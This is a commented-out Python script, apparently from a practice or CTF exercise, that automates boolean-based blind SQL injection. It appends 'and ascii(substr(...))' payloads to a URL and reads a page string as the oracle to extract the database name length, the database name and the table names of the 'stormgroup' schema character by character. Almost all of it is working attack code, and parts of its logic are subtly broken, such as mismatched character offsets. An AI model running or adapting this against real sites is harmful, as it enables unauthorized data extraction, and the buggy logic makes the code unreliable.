```
# #本次所需要用到的SQL
# sql_database_length = " and length(database()) ="
# sql_database_name = " and ascii(substr(database(),{index},1)) ="
# sql_tables_name = " and ascii(substr((select table_name from information_schema.tables where table_schema = 'stormgroup' limit {index},1),{index1},1)) = "
# rex = "关于平台停机维护的通知" #用于检测页面是否返回正常
# x = 97 #a
# all = 32
# #检测页面是否返回正常
# def jc(payload,rex):
#     r = requests.get(payload)
#     result = re.findall(rex,r.text)
#     if len(result) == 1:
#         return 1

# #检测数据库长度
# def jc_database_length(payload):
#     for i in range(0,99):
#         if jc(payload+str(i),rex):
#             return i

# #检测数据库名称
# def jc_database_name(payload):
#     database_name = ''
#     for i in range(0,20):
#         for index in range(0,24):
#             if jc(payload.replace("{index}",str(i))+str(index+x),rex):
#                 database_name+=chr(index+x)
#                 break
#             if index == 24:
#                 return database_name       
#     return database_name
# #检测数据库表
# def jc_table_name(payload):
#     table_name = ''
#     for i in range(2,50):
#         for index in range(0,95):
#             print(payload.replace("{index1}",str(i))+str(index+all))
#             if jc(payload.replace("{index1}",str(i))+str(index+all),rex):
#                 table_name+=chr(index+x)
#                 break
#             if index == 94:
#                 return table_name
#     return table_name

# def getTableNameList(payload):
#     tableNameList = []
#     for i in range(1,50):
#         tableName = jc_table_name(payload.replace("{index}",str(i)))
#         tableNameList.append(tableName)
#         if tableName == '':
#             return tableNameList
#     return tableNameList

# # databaseLength = jc_database_length(url+sql_database_length)
# # print("数据库名长度："+str(databaseLength))
# # databaseName = jc_database_name(url+sql_database_name)
# # print("数据库名："+databaseName)
# tableNameList = getTableNameList(url+sql_tables_name)
# print("数据库表：")
# print(tableNameList)
```